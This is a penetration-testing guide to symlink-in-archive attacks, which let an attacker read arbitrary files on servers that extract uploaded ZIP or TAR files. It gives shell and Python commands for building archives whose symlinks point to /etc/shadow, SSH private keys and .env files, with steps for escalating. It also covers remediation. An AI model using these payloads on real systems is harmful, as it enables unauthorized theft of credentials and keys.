# Symlink Attacks (Arbitrary File Read via Symlink in Archive)

## Overview
Symlink attacks exploit symbolic link handling in archive extraction (ZIP, TAR) or file operation workflows. When a zip/tar archive containing a symlink is extracted by a server-side process, the symlink may point outside the intended extraction directory — to `/etc/passwd`, application configs, or private keys. If the application then serves or processes that file, it reads the attacker-controlled symlink target.

## How It Works
- Create a zip archive containing a symlink: `ln -s /etc/passwd link.txt && zip --symlinks archive.zip link.txt`.
- Upload the archive to a web application that extracts it (profile picture packs, theme uploads, batch imports).
- The server extracts the zip and creates a symlink file pointing to `/etc/passwd`.
- If the application serves or processes the extracted "file," it reads `/etc/passwd` instead.
- Similar to ZipSlip but focused on symlinks rather than path traversal within the archive.

## Impact
- Arbitrary file read on the server (private keys, credentials, source code).
- In write scenarios: overwriting symlink-targeted files (config overwrite → code execution).
- Combined with follow-on file read endpoint, complete server compromise.

## Where to Look
- Archive upload features (ZIP, TAR, GZ, TGZ): theme uploads, plugin installs, project imports, batch data upload.
- Backup restoration features.
- Application update mechanisms that extract archives.
- Any endpoint where an uploaded ZIP is extracted server-side.

## Testing Steps
1. Identify any feature that accepts archive uploads and extracts them.
2. Create a malicious ZIP with a symlink:
   ```bash
   mkdir symlink_test && cd symlink_test
   ln -s /etc/passwd etc_passwd
   zip --symlinks payload.zip etc_passwd
   ```
3. Upload the archive.
4. Check if the application serves the extracted file — access the uploaded "etc_passwd" via the download/view endpoint.
5. If `/etc/passwd` content is returned → symlink traversal confirmed.
6. Escalate: create symlinks to `/etc/shadow`, `~/.ssh/id_rsa`, application `.env`.

## Payloads / Techniques
```bash
# Create symlink archive (Linux)
mkdir /tmp/symlink_attack && cd /tmp/symlink_attack

# Symlink pointing to /etc/passwd
ln -s /etc/passwd secret.txt
zip --symlinks payload.zip secret.txt

# Multiple sensitive targets
ln -s /etc/shadow shadow.txt
ln -s ~/.ssh/id_rsa id_rsa.txt
ln -s /var/www/html/.env env.txt
zip --symlinks multi_payload.zip secret.txt shadow.txt id_rsa.txt env.txt

# Tar-based symlink attack
tar --create --file symlink_attack.tar secret.txt
# Or more directly:
tar czf payload.tar.gz secret.txt

# Python: Create malicious zip programmatically
python3 << 'EOF'
import zipfile, os

with zipfile.ZipFile('evil.zip', 'w') as zf:
    # Create a ZipInfo with a symlink external_attr
    info = zipfile.ZipInfo('link.txt')
    info.create_system = 3   # Unix
    info.external_attr = 0xA1ED0000  # symlink attributes: 0xA = 0o120000 | 0755
    zf.writestr(info, '/etc/passwd')  # Symlink target
    print("Created evil.zip with symlink -> /etc/passwd")
EOF

# Verify the zip contains a symlink
python3 -c "
import zipfile
with zipfile.ZipFile('evil.zip') as z:
    for info in z.infolist():
        is_symlink = (info.external_attr >> 16) & 0o170000 == 0o120000
        print(f'{info.filename}: is_symlink={is_symlink}, target={z.read(info.filename).decode()}')"
```

## Burp Suite Tips
- Intercept the archive upload request in **Proxy** and verify the file is sent.
- After upload, access the extracted file via the file download/view endpoint in **Repeater**.
- If the file-serving endpoint requires a specific path, enumerate paths from the server's extraction directory.

## Tools
- zip command with `--symlinks` flag
- Python zipfile module for programmatic symlink creation
- ZipSlip tester — https://github.com/snyk/zip-slip-vulnerability/tree/master/archives (includes symlink archives)

## Remediation
- After extracting archives, resolve symlinks with `os.path.realpath()` and verify the resolved path is within the extraction directory.
- In Java: use `Files.readSymbolicLink()` and validate the link target before following.
- Disable symlink following when extracting archives:
  - Python `zipfile`: check external_attr for symlink type before extracting.
  - Java Apache Commons Compress: check entry type for symlinks.
- Use secure archive extraction libraries that handle symlinks safely.
- Run extraction in an isolated container/sandbox with no access to sensitive files.

## References
https://snyk.io/research/zip-slip-vulnerability
https://owasp.org/www-project-web-security-testing-guide/
https://portswigger.net/web-security/file-path-traversal
https://github.com/snyk/zip-slip-vulnerability
